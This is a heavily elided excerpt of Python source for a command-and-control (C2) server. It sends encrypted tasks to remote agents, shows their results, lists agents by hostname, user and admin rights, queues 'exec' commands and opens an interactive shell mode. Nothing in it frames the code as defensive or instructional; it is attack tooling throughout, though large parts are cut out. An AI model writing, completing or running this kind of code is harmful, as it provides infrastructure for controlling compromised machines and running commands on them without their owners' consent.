        ...
        try:
            ...
            if task:
                ...
                encrypted = CRYPTO.encrypt(
                    json.dumps(task_data).encode(), agent_id)
                self.send_json({"enc": encrypted})
                console.print(
                    f"[cyan]Task sent to {agent_id[:8]}: {task.task_type}[/]")
            else:
    ...
    def handle_result(self, body: str):
        ...
        try:
            ...
            console.print(
                Panel(
                    result,
                    title=f"Result from {agent_id[:8]}",
                    border_style="green"))
...
class C2Server:
    ...
    def start(self):
        ...
        if self.cert_file and self.key_file:
            ...
            console.print(
                f"[green]C2 Server started on https://{self.host}:{self.port}[/]")
        else:
            console.print(
                f"[yellow]C2 Server started on http://{self.host}:{self.port} (no TLS)[/]")
...
def print_agents():
    ...
    for a in agents:
        ...
        table.add_row(a['id'], a['hostname'], a['user'],
                      admin, status, str(a['pending_tasks']))
    ...
    while True:
        try:
            ...
            if action == 'agents':
                ...
                if current:
                    task = MANAGER.queue_task(
                        current.agent_id, "exec", parts[1])
                    console.print(f"[cyan]Task queued: {task.task_id[:8]}[/]")
                else:
                    console.print(
                        "[red]No agent selected. Use 'use <id>' first[/]")

            elif action == 'shell':
                if current:
                    console.print(
                        "[yellow]Shell mode - type commands, 'back' to exit[/]")
                    while True:
